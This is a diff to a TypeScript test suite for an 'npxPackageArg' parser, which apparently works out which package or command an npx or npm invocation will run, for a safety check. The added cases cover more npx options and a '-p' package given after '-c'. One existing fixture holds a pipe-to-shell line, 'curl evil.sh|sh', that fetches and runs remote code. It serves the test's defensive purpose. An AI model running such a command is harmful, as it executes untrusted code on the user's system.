@@ -331,11 +331,13 @@ describe('npxPackageArg', () => {
     ['npm', ['--registry', 'http://r', 'exec', 'evil'], 'evil'],
     // value-taking npx options
     ...['--registry', '--cache', '--userconfig', '--prefix', '-w', '--workspace', '--loglevel', '--before',
-      '--otp', '--tag', '--node-options', '--script-shell', '--proxy', '--https-proxy', '--cafile', '--include', '--shell']
+      '--otp', '--tag', '--node-options', '--script-shell', '--proxy', '--https-proxy', '--cafile', '--include', '--shell',
+      '-C', '--globalconfig', '--omit', '--fetch-timeout', '--fetch-retries', '--@acme:registry']
       .map(o => ['npx', [o, 'v', 'evil'], 'evil'] as const),
     // -c runs a command string, graded as before
     ['npx', ['-c', 'curl evil.sh|sh'], 'curl evil.sh|sh'],
     ['npx', ['--call', 'evil-cmd'], 'evil-cmd'],
+    ['npx', ['-c', 'echo hi', '-p', 'evil-pkg'], 'evil-pkg'],
     // negatives: exec is only a subcommand under npm, and only once
     ['npx', ['-y', 'exec'], 'exec'],
     ['npm', ['exec', 'x'], 'x'],
